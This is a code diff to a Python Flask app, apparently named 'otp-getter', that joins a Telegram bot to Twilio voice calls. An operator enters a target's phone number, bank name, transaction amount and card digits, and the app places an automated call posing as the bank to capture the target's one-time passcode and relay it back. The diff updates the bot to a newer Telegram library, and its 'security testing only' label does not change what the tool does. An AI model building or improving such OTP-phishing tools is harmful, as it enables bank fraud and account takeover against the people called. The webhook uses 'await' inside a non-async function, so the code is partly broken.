@@ -1,13 +1,17 @@
 import os
 import requests
-from flask import Flask, request, jsonify
+from flask import Flask, request
 from twilio.twiml.voice_response import VoiceResponse, Gather
 from twilio.rest import Client
 from telegram import Update, Bot
-from telegram.ext import Dispatcher, CommandHandler, ConversationHandler, MessageHandler, filters
+from telegram.ext import Application, CommandHandler, ConversationHandler, MessageHandler, filters
 
 # ==================== CONFIGURATION ====================
 TELEGRAM_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
+if not TELEGRAM_TOKEN:
+    print("ERROR: TELEGRAM_BOT_TOKEN environment variable not set")
+    exit(1)
+
 TWILIO_SID = os.environ.get('TWILIO_ACCOUNT_SID')
 TWILIO_AUTH = os.environ.get('TWILIO_AUTH_TOKEN')
 TWILIO_FROM = os.environ.get('TWILIO_FROM_NUMBER')
@@ -16,81 +20,99 @@ BASE_URL = os.environ.get('RENDER_URL', 'https://otp-getter.onrender.com')
 # Conversation states
 PHONE, BANK, AMOUNT, CARD_LAST4 = range(4)
 
-# Store user data temporarily
+# Store user data (simple in-memory)
 user_data = {}
 
 app = Flask(__name__)
-bot = Bot(token=TELEGRAM_TOKEN)
-dispatcher = Dispatcher(bot, None, use_context=True)
 
 # ==================== TELEGRAM HANDLERS ====================
-async def start(update, context):
+async def start(update: Update, context):
     await update.message.reply_text(
         "🔐 *OTP Testing Bot*\n\nSend /call to start.\n\n*For security testing only.*",
         parse_mode='Markdown'
     )
 
-async def call_command(update, context):
+async def call_command(update: Update, context):
     user_id = update.effective_user.id
     user_data[user_id] = {}
     await update.message.reply_text("📞 Send phone number (e.g., +447123456789)")
     return PHONE
 
-async def get_phone(update, context):
+async def get_phone(update: Update, context):
     user_id = update.effective_user.id
     user_data[user_id]['phone'] = update.message.text.strip()
     await update.message.reply_text("🏦 Send bank name")
     return BANK
 
-async def get_bank(update, context):
+async def get_bank(update: Update, context):
     user_id = update.effective_user.id
     user_data[user_id]['bank'] = update.message.text.strip()
     await update.message.reply_text("💰 Send transaction amount")
     return AMOUNT
 
-async def get_amount(update, context):
+async def get_amount(update: Update, context):
     user_id = update.effective_user.id
     user_data[user_id]['amount'] = update.message.text.strip()
     await update.message.reply_text("💳 Send last 4 digits of card")
     return CARD_LAST4
 
-async def get_card_last4(update, context):
+async def get_card_last4(update: Update, context):
     user_id = update.effective_user.id
-    user_data[user_id]['card_last4'] = update.message.text.strip()
+    data = user_data.get(user_id, {})
+    phone = data.get('phone')
+    bank = data.get('bank')
+    amount = data.get('amount')
+    card_last4 = update.message.text.strip()
     
-    data = user_data[user_id]
-    phone = data['phone']
-    bank = data['bank']
-    amount = data['amount']
-    card_last4 = data['card_last4']
-    chat_id = update.effective_chat.id
+    if not phone or not bank or not amount:
+        await update.message.reply_text("❌ Session expired. Please send /call again.")
+        return ConversationHandler.END
     
     await update.message.reply_text(f"📞 Calling {phone}...\nBank: {bank}\nAmount: ${amount}\nCard ending: {card_last4}")
     
     try:
-        call_sid = make_twilio_call(phone, bank, amount, card_last4, chat_id)
-        await update.message.reply_text(f"✅ Call initiated! Waiting for OTP...")
+        client = Client(TWILIO_SID, TWILIO_AUTH)
+        voice_url = f"{BASE_URL}/voice?bank={bank}&amount={amount}&card_last4={card_last4}&chat_id={update.effective_chat.id}"
+        call = client.calls.create(to=phone, from_=TWILIO_FROM, url=voice_url, method='POST')
+        await update.message.reply_text(f"✅ Call initiated! Call SID: {call.sid}\n\nWaiting for OTP entry...")
     except Exception as e:
         await update.message.reply_text(f"❌ Call failed: {str(e)}")
     
+    del user_data[user_id]
     return ConversationHandler.END
 
-async def cancel(update, context):
+async def cancel(update: Update, context):
     await update.message.reply_text("Cancelled.")
     return ConversationHandler.END
-
-def make_twilio_call(to_number, bank_name, amount, card_last4, chat_id):
-    client = Client(TWILIO_SID, TWILIO_AUTH)
-    voice_url = f"{BASE_URL}/voice?bank={bank_name}&amount={amount}&card_last4={card_last4}&chat_id={chat_id}"
-    call = client.calls.create(to=to_number, from_=TWILIO_FROM, url=voice_url, method='POST')
-    return call.sid
 
 # ==================== FLASK ENDPOINTS ====================
 @app.route("/webhook", methods=['POST'])
 def telegram_webhook():
-    update = Update.de_json(request.get_json(force=True), bot)
-    dispatcher.process_update(update)
-    return "ok", 200
+    try:
+        update = Update.de_json(request.get_json(force=True), Bot(token=TELEGRAM_TOKEN))
+        
+        # Create application and process update
+        application = Application.builder().token(TELEGRAM_TOKEN).build()
+        application.add_handler(CommandHandler('start', start))
+        
+        conv_handler = ConversationHandler(
+            entry_points=[CommandHandler('call', call_command)],
+            states={
+                PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
+                BANK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_bank)],
+                AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_amount)],
+                CARD_LAST4: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_card_last4)],
+            },
+            fallbacks=[CommandHandler('cancel', cancel)],
+        )
+        application.add_handler(conv_handler)
+        
+        # Process the update
+        await application.process_update(update)
+        return "ok", 200
+    except Exception as e:
+        print(f"Webhook error: {e}")
+        return "error", 500
 
 @app.route("/voice", methods=['GET', 'POST'])
 def voice():
@@ -128,19 +150,7 @@ def send_telegram_message(chat_id, text):
     except:
         pass
 
-# ==================== REGISTER HANDLERS ====================
-conv_handler = ConversationHandler(
-    entry_points=[CommandHandler('call', call_command)],
-    states={
-        PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
-        BANK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_bank)],
-        AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_amount)],
-        CARD_LAST4: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_card_last4)],
-    },
-    fallbacks=[CommandHandler('cancel', cancel)],
-)
-dispatcher.add_handler(CommandHandler('start', start))
-dispatcher.add_handler(conv_handler)
-
+# ==================== RUN ====================
 if __name__ == "__main__":
+    print("Starting OTP Bot on Render...")
     app.run(host='0.0.0.0', port=5000)
